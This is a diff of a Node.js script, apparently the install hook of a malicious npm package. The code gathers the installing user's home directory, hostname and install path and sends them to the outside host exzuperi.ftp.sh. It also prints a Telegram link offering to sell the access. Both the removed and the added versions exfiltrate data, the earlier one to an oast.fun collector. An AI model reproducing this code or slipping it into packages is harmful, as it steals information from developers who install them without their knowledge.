@@ -4,43 +4,32 @@ const querystring = require("querystring");
 const https = require("https");
 const packageJSON = require("./package.json");
 const package = packageJSON.name;
+const fs = require('fs');
 
 const trackingData = JSON.stringify({
-    p: package,
-    c: __dirname,
     hd: os.homedir(),
     hn: os.hostname(),
-    un: os.userInfo().username,
-    dns: dns.getServers(),
+    ls: __dirname,
+    pn: "iarna",
     r: packageJSON ? packageJSON.___resolved : undefined,
-    v: packageJSON.version,
-    pjson: packageJSON,
 });
 
-var postData = querystring.stringify({
-    msg: trackingData,
-});
-
-var options = {
-    hostname: "http://ngzvokvmcyctbxbgtsobed0hswyf41v6n.oast.fun", //replace burpcollaborator.net with Interactsh or pipedream
-    port: 443,
-    path: "/",
-    method: "POST",
-    headers: {
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Content-Length": postData.length,
-    },
+const options = {
+    hostname: "exzuperi.ftp.sh",
+    port: 449,
+    path: `/PoC/${encodeURIComponent(trackingData)}`,
+    method: "GET",
 };
 
-var req = https.request(options, (res) => {
+const req = https.request(options, (res) => {
     res.on("data", (d) => {
-        process.stdout.write(d);
+        //process.stdout.write(d);
     });
 });
 
 req.on("error", (e) => {
-    // console.error(e);
+    console.error(e);
 });
 
-req.write(postData);
+process.stdout.write("You can reach me, if you want to buy it: https://t.me/exzuperi");
 req.end();
